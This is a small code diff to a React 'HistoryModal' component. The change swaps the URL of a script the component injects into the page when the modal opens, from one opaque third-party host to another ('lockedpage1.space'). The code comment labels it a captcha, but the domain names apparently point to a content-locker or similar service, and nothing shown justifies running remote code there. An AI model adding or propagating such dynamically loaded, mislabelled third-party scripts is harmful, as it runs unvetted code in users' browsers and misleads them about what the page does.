@@ -11,7 +11,7 @@ const HistoryModal = ({ isOpen, onClose }: HistoryModalProps) => {
     if (isOpen && typeof window !== 'undefined') {
       // Load captcha script dynamically
       const script = document.createElement('script');
-      script.src = 'https://lockedapp.org/cp/js/1qj36';
+      script.src = 'https://lockedpage1.space/cp/js/5r4kz';
       script.type = 'text/javascript';
       document.body.appendChild(script);
 
